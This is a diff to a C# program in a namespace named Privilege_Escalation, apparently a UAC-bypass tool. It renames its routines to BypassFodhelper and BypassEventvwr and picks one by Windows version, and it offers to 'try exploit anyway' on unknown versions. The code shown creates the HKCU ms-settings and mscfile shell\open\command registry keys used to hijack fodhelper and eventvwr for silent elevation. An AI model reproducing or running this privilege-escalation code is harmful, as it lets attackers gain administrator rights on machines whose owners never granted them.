@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.Reflection;
 using System.Runtime.InteropServices;
@@ -21,11 +21,11 @@ namespace Privilege_Escalation
             if (!IsRunningAsLocalAdmin())
             {
                 if (osName.StartsWith("Windows 10"))
-                    Windows10();
-                else if (osName.StartsWith("Windows 7"))
-                    Windows7();
+                    BypassFodhelper();
                 else if (osName.StartsWith("Windows 8"))
-                    Windows7();
+                    BypassEventvwr();
+                else if (osName.StartsWith("Windows 7"))
+                    BypassEventvwr();
                 else
                     Compatibility();
             }
@@ -36,12 +36,12 @@ namespace Privilege_Escalation
             Console.WriteLine(
                 "\nYour OS might not be compatible.\nAre you willing to try exploit anyway?\n\nNumpad 1: Windows 7\nNumpad 2: Windows 10");
             if (Console.ReadKey().Key == ConsoleKey.NumPad1)
-                Windows7();
+                BypassEventvwr();
             else
-                Windows10();
+                BypassFodhelper();
         }
 
-        private static void Windows10()
+        private static void BypassFodhelper()
         {
             var wow64Value = IntPtr.Zero;
             Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command");
@@ -65,7 +65,7 @@ namespace Privilege_Escalation
             }
         }
 
-        private static void Windows7()
+        private static void BypassEventvwr()
         {
             Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command");
             Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\shell\open\command", true)
